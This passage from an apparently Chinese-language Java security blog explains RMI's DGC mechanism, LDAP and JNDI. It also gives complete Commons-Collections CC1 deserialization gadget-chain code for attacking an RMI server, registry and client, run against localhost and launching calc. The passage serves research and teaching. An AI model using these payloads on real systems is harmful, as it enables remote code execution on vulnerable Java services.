title="序列化写入"></p><p>写入完，释放掉读取流、输入流，就完成了服务端对客户端数据的处理过程</p><h3 id="8、DGC创建"><a href="#8、DGC创建" class="headerlink" title="8、DGC创建"></a>8、DGC创建</h3><p>DGC全名（Distributed Garbage Collection），是一种分布式垃圾回收机制，用来回收不用的远程对象，注册中心的创建过程中会创建DGC</p><p>跟进GDC创建，前面的分析在创建注册中心分析过了，直接到创建的关键步骤（<code>putTarget</code>）</p><p>前文提到在创建过程会创建注册中心<code>stub、skel</code>等信息最终放到<code>target</code>里面，最后将<code>target</code>放到<code>objtable</code>里</p><p>在最后一步<code>putTarget</code>中，会调用<code>DGCImpl</code></p><p><img src="/posts/ad3be040/r-131.png" title="DGCImpl创建"></p><p>DGC调用了一个静态方法<code>dgcLog</code>，在调用静态方法的时候会通过调用静态函数进行实例化DGC对象</p><p><img src="/posts/ad3be040/r-132.png" title="DGCImpl创建"></p><p>DGC的静态方法中完成了对DGC的<code>disp、stub、skel</code>的创建，创建过程和注册中心的创建类似，不再重复分析，创建完后最后放进<code>objtable</code>表中</p><p><img src="/posts/ad3be040/r-133.png" title="DGCImpl创建"><br><img src="/posts/ad3be040/r-134.png" title="DGCImpl创建"></p><p>同注册中心一样，<code>DGCImpl</code>也存在自己的<code>stub</code>和<code>skel</code>，执行位置也很相似，<code>skel</code>监听线程中通过<code>dispatch</code>方法执行分支<br><code>DGCImpl_Stub</code>主要实现两个功能：<code>clean</code>、<code>dirty</code></p><p><code>clean</code>的作用是清除回收远程连接对象，创建<code>call</code>连接流，将<code>ObjId</code>、<code>长度</code>等序列化写入，然后调用<code>invoke</code>方法</p><p><img src="/posts/ad3be040/r-135.png" title="clean"></p><p>在调用<code>invoke</code>方法时，在客户端调用注册中心的时候说过会最后执行<code>executeCall</code>方法对数据进行反序列化读取</p><p><img src="/posts/ad3be040/r-80.png" title="executeCall"></p><p><code>dirty</code>方法的作用是客户端调用服务器远程引用时，使用<code>dirty</code>来注册一个临时的远程引用，后续还想使用该远程引用，就再次使用<code>dirty</code>方法去续租<br>同样该方法也会调用<code>invoke</code>反序列化读取信息</p><p><img src="/posts/ad3be040/r-136.png" title="dirty"></p><p>然后DGC服务端的主要方法<code>dispatch</code>，可以看到和注册中心的执行模式非常相似</p><p>也主要有两个分支分别针对<code>clean</code>和<code>dirty</code></p><p><img src="/posts/ad3be040/r-137.png" title="dispatch"><br><img src="/posts/ad3be040/r-138.png" title="dispatch"></p><p>针对不同的方法调用都显示反序列化获取<code>stub</code>客户端先写入的信息<code>ObjId</code>、<code>租赁信息</code>等，最后再通过<code>DGCImpl</code>的<code>clean/dirty</code>方法对远程引用进行清除和租赁。</p><p>由于<code>Skel/stub</code>都存在反序列化点，因此针对该DGC的攻击被称为JRMP攻击。</p><h2 id="四、流程总结"><a href="#四、流程总结" class="headerlink" title="四、流程总结"></a>四、流程总结</h2><p>直接引用java安全rmi文章总结，写的很清晰了</p><p>RMI底层通讯采用了Stub(运行在客户端)和Skeleton(运行在服务端)机制，RMI调用远程方法的大致如下：</p><ol><li><p>RMI客户端在调用远程方法时会先创建Stub(sun.rmi.registry.RegistryImpl_Stub)。</p></li><li><p>Stub会将Remote对象传递给远程引用层(java.rmi.server.RemoteRef)并创建java.rmi.server.RemoteCall(远程调用)对象。</p></li><li><p>RemoteCall序列化RMI服务名称、Remote对象。</p></li><li><p>RMI客户端的远程引用层传输RemoteCall序列化后的请求信息通过Socket连接的方式（传输层）传输到RMI服务端的远程引用层。</p></li><li><p>RMI服务端的远程引用层(sun.rmi.server.UnicastServerRef)收到请求会请求传递给Skeleton(sun.rmi.registry.RegistryImpl_Skel.dispatch)。</p></li><li><p>Skeleton调用RemoteCall反序列化RMI客户端传过来的序列化。</p></li><li><p>Skeleton处理客户端请求：bind、list、lookup、rebind、unbind，如果是lookup则查找RMI服务名绑定的接口对象，序列化该对象并通过RemoteCall传输到客户端。</p></li><li><p>RMI客户端反序列化服务端结果，获取远程对象的引用。</p></li><li><p>RMI客户端调用远程方法，RMI服务端反射调用RMI服务实现类的对应方法并序列化执行结果返回给客户端</p></li><li><p>RMI客户端反序列化RMI远程方法调用结果。</p></li></ol><h2 id="五、RMI利用"><a href="#五、RMI利用" class="headerlink" title="五、RMI利用"></a>五、RMI利用</h2><h3 id="1、攻击服务端Server"><a href="#1、攻击服务端Server" class="headerlink" title="1、攻击服务端Server"></a>1、攻击服务端Server</h3><p>客户端通过注册中心获取到通信服务器端的stub，客户端直接向服务端进行通信，服务端通过获取客户端的参数进行反序列化结合组件触发漏洞</p><p>示例环境：java版本8u66，服务器使用cc3.1组件，服务端存在Object参数传入</p><p>RMIObject:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RMIObject</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(String hello)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">helloObj</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RMIObjectImpl:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIObjectImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RMIObject</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RMIObjectImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException&#123;</span><br><span class="line">        <span class="comment">//UnicastRemoteObject.exportObject(this,0);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(String hello)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;远程调用输出：&quot;</span>+hello);</span><br><span class="line">        <span class="keyword">return</span> hello;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">helloObj</span><span class="params">(Object obj)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;远程调用obj输出：&quot;</span>+obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端调用cc1链对象传入</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException,Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">rg</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="type">RMIObject</span> <span class="variable">rc</span> <span class="operator">=</span> (RMIObject) rg.lookup(<span class="string">&quot;RMIObject&quot;</span>);</span><br><span class="line">        rc.helloObj(payload());</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">payload</span><span class="params">()</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">            Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                    <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                    <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">            <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">            <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">            <span class="type">Map</span> <span class="variable">tmap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, transformerChain);</span><br><span class="line">            <span class="comment">//反射获取AnnotationInvocationHandler的对象传入tmap</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">            declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> declaredConstructor.newInstance(Generated.class, tmap);</span><br><span class="line">            <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：<br><img src="/posts/ad3be040/r-128.png" title="攻击服务端"></p><h3 id="2、攻击注册中心Registry"><a href="#2、攻击注册中心Registry" class="headerlink" title="2、攻击注册中心Registry"></a>2、攻击注册中心Registry</h3><p>在底层调试分析注册中心处理客户端和服务端请求的时候提到，根据不同的分支进入对应的处理，其中客户端使用的<code>lookup</code>方法参数为字符串，因此不能通过<code>lookup</code>方法传递<code>Object</code>对象攻击注册中心，但服务端&#x2F;客户端可调用<code>bind</code>、<code>rebind</code>等方法绑定对象，将<code>Object</code>对象传入，注册中心再接收到服务端&#x2F;客户端的<code>bind</code>对象进行反序列化读取时，触发漏洞<br>服务端：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] agrs)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException,Exception &#123;</span><br><span class="line">        <span class="comment">//创建远程调用对象</span></span><br><span class="line">        RMIObject rmo=<span class="keyword">new</span> <span class="title class_">RMIObjectImpl</span>();</span><br><span class="line">        <span class="comment">//创建注册中心绑定调用端口</span></span><br><span class="line">        Registry rg= LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="comment">//Registry rg = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099);</span></span><br><span class="line">        <span class="comment">//注册绑定调用服务</span></span><br><span class="line">        rg.bind(<span class="string">&quot;RMIObject&quot;</span>,rmo);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>客户端向注册中心绑定恶意<code>Bind</code>：<br>由于<code>bind</code>对象是需要<code>Remote</code>对象，因此调用的链最后需要将返回的对象添加一个动态代理返回给<code>Remote</code>对象即可，在cc1链上最后返回值加工一下即可</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException,Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">rg</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="comment">//恶意bind，注册中心反序列化解析bind对象时触发漏洞</span></span><br><span class="line">        rg.bind(<span class="string">&quot;payload&quot;</span>,payload());</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title function_">payload</span><span class="params">()</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">            Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                    <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                    <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">            <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">            <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            <span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">            Map Lmap= LazyMap.decorate(map,transformerChain);</span><br><span class="line">            <span class="comment">//反射调用AnnotationInvocationHandler类</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">            declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">//创建代理InvocationHandler对象调用AnnotationInvocationHandler类</span></span><br><span class="line">            InvocationHandler invohandler=(InvocationHandler)declaredConstructor.newInstance(Generated.class,Lmap);</span><br><span class="line">            <span class="comment">//创建proxy代理对象，参数分别为Map加载器、Map类数组、InvocationHandler对象invohandler</span></span><br><span class="line">            Map proxymap=(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,invohandler);</span><br><span class="line">            <span class="comment">//通过代理调用代理对象，执行invoke方法</span></span><br><span class="line">            InvocationHandler invohandlerproxy=(InvocationHandler)declaredConstructor.newInstance(Generated.class,proxymap);</span><br><span class="line">            Remote remobj=(Remote) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Remote.class&#125;,invohandlerproxy);</span><br><span class="line">            <span class="keyword">return</span> remobj;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>实现效果：<br><img src="/posts/ad3be040/r-129.png" title="攻击注册中心"></p><h3 id="3、攻击客户端Client"><a href="#3、攻击客户端Client" class="headerlink" title="3、攻击客户端Client"></a>3、攻击客户端Client</h3><p>客户端向注册中心请求会返回<code>stub</code>时，会反序列化解析数据导致漏洞，也可以在服务端放置恶意的方法返回对象，客户端调用服务端的方法时解析放回来的数据时导致漏洞。</p><p>原理相同这里以服务器端放置恶意方法返回给客户端进行解析触发漏洞举例</p><p>服务端：<br>RMIObject:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RMIObject</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(String hello)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">helloObj</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException,Exception;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>RMIObjectImpl</code>放置恶意方法:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIObjectImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RMIObject</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RMIObjectImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException&#123;</span><br><span class="line">        <span class="comment">//UnicastRemoteObject.exportObject(this,0);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(String hello)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;远程调用输出：&quot;</span>+hello);</span><br><span class="line">        <span class="keyword">return</span> hello;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">helloObj</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">tmap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        <span class="comment">//反射获取AnnotationInvocationHandler的对象传入tmap</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> declaredConstructor.newInstance(Generated.class, tmap);</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>客户端调用：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException,Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">rg</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="type">RMIObject</span> <span class="variable">rc</span> <span class="operator">=</span> (RMIObject) rg.lookup(<span class="string">&quot;RMIObject&quot;</span>);</span><br><span class="line">        <span class="comment">//调用服务端恶意方法</span></span><br><span class="line">        rc.helloObj();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>执行效果：<br><img src="/posts/ad3be040/r-130.png" title="攻击客户端"></p><h1 id="0x02、LDAP"><a href="#0x02、LDAP" class="headerlink" title="0x02、LDAP"></a>0x02、LDAP</h1><p><strong>LDAP描述</strong><br>引用：</p><blockquote><p>LDAP是轻量目录访问协议(LightweightDirectory Access Protocol)，是一种轻型目录访问协议，主要用于目录中资源的搜索和查询，是X.500的一种简便的实现。<br>目录是一个为查询、浏览和搜索而优化的数据库，是树状结构组织数据，通过TCP&#x2F;IP传输服务运行。</p></blockquote><p>LDAP作用是类似文件目录，而不是实际的数据库，功能作用比喻就是电话簿、地址簿。</p><p>LDAP服务常见端口：LDAP:389  LDAPS:636</p><p>引用<a href="https://daiker.gitbook.io/windows-protocol/ldap-pian/8#0x01-ldap-jian-jie">文章</a>中的原理图：</p><p><img src="/posts/ad3be040/r-186.png" title="LDAP原理图"></p><p>这里直接引用<a href="https://www.cnblogs.com/wilburxu/p/9174353.html">相关概念</a>，写的很清楚了<br>以及引用概念：<br>目录树：</p><ol><li>目录树：在一个目录服务系统中，整个目录信息集可以表示为一个目录信息树，树中的每个节点是一个条目。</li><li>条目：每个条目就是一条记录，每个条目有自己的唯一可区别的名称（DN）。</li><li>对象类：与某个实体类型对应的一组属性，对象类是可以继承的，这样父类的必须属性也会被继承下来。</li><li>属性：描述条目的某个方面的信息，一个属性由一个属性类型和一个或多个属性值组成，属性有必须属性和非必须属性。</li></ol><p>DC、UID、OU、CN、SN、DN、RDN相关含义：</p><table><thead><tr><th>关键字</th><th>英文全称</th><th>含义</th></tr></thead><tbody><tr><td>dc</td><td>Domain Component</td><td>域名的部分，其格式是将完整的域名分成几部分，如域名为example.com变成dc&#x3D;example,dc&#x3D;com（一条记录的所属位置）</td></tr><tr><td>uid</td><td>User Id</td><td>用户ID songtao.xu（一条记录的ID）</td></tr><tr><td>ou</td><td>Organization Unit</td><td>组织单位，组织单位可以包含其他各种对象（包括其他组织单元），如“oa组”（一条记录的所属组织）</td></tr><tr><td>cn</td><td>Common Name</td><td>公共名称，如“Thomas Johansson”（一条记录的名称）</td></tr><tr><td>sn</td><td>Surname</td><td>姓，如“许”</td></tr><tr><td>dn</td><td>Distinguished Name</td><td>“uid&#x3D;songtao.xu,ou&#x3D;oa组,dc&#x3D;example,dc&#x3D;com”，一条记录的位置（唯一）</td></tr><tr><td>rdn</td><td>Relative dn</td><td>相对辨别名，类似于文件系统中的相对路径，它是与目录树结构无关的部分，如“uid&#x3D;tom”或“cn&#x3D; Thomas Johansson”</td></tr></tbody></table><h1 id="0x03、JNDI"><a href="#0x03、JNDI" class="headerlink" title="0x03、JNDI"></a>0x03、JNDI</h1><h2 id="一、JNDI描述"><a href="#一、JNDI描述" class="headerlink" title="一、JNDI描述"></a>一、JNDI描述</h2><p>JNDI(Java Naming and Directory Interface)，命名和目录接口。</p><p>引用描述：</p><blockquote><p>JNDI (Java Naming and Directory Interface) 是一组应用程序接口，它为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定位用户、网络、机器、对象和服务等各种资源。比如可以利用JNDI在局域网上定位一台打印机，也可以用JNDI来定位数据库服务或一个远程Java对象。JNDI底层支持RMI远程对象，RMI注册的服务可以通过JNDI接口来访问和调用。</p><p>JNDI支持多种命名和目录提供程序（Naming and Directory Providers），RMI注册表服务提供程序（RMI Registry Service Provider）允许通过JNDI应用接口对RMI中注册的远程对象进行访问操作。将RMI服务绑定到JNDI的一个好处是更加透明、统一和松散耦合，RMI客户端直接通过URL来定位一个远程对象，而且该RMI服务可以和包含人员，组织和网络资源等信息的企业目录链接在一起。</p></blockquote><p>功能描述和框架：</p><p><img src="/posts/ad3be040/r-139.png" title="JNDI"><br><img src="/posts/ad3be040/r-140.png" title="JNDI"></p><p>实现效果就是通过一个字符串来绑定对象如（rmi、ldap、CORBA、dns等等），把这些服务当作容器，通过JNDI封装一下来调用这些容器，充当一个API的作用</p><h2 id="二、简单实现"><a href="#二、简单实现" class="headerlink" title="二、简单实现"></a>二、简单实现</h2><h3 id="1、jndi-rmi原生调用"><a href="#1、jndi-rmi原生调用" class="headerlink" title="1、jndi-rmi原生调用"></a>1、jndi-rmi原生调用</h3><p>原生调用方式跟RMI差不多，相当于在RMI上套了一层壳去调用，相关漏洞也跟RMI漏洞一样</p><p>JNDI本身不区分客户端和服务端，由于绑定对象在服务端，因此在服务端进行的绑定JNDI，JNDIClient在服务端和客户端均可。<br>JNDIServer:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] agrs)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException,Exception &#123;</span><br><span class="line">        InitialContext ic=<span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        ic.rebind(<span class="string">&quot;rmi://localhost:1099/RMIObject&quot;</span>,<span class="keyword">new</span> <span class="title class_">RMIObjectImpl</span>());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/ad3be040/r-141.png" title="JNDIServer"></p><p>JNDIClient:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException,Exception &#123;</span><br><span class="line">        InitialContext ic=<span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        RMIObject rl=(RMIObject) ic.lookup(<span class="string">&quot;rmi://localhost:1099/RMIObject&quot;</span>);</span><br><span class="line">        System.out.println(rl.hello(<span class="string">&quot;hi&quot;</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/ad3be040/r-142.png" title="JNDIClient"></p><h3 id="2、References-rmi注入-核心"><a href="#2、References-rmi注入-核心" class="headerlink" title="2、References-rmi注入(核心)"></a>2、References-rmi注入(核心)</h3><p>引用核心部分说明：</p><blockquote><p>在JNDI服务中，RMI服务端除了直接绑定远程对象之外，还可以通过References类来绑定一个外部的远程对象（当前名称目录系统之外的对象）。绑定了Reference之后，服务端会先通过Referenceable.getReference()获取绑定对象的引用，并且在目录中保存。当客户端在lookup()查找这个远程对象时，客户端会获取相应的object factory，最终通过factory类将reference转换为具体的对象实例。</p></blockquote><p>以及利用流程：</p><ul><li>1.目标代码中调用了 InitialContext.lookup(URI)，且 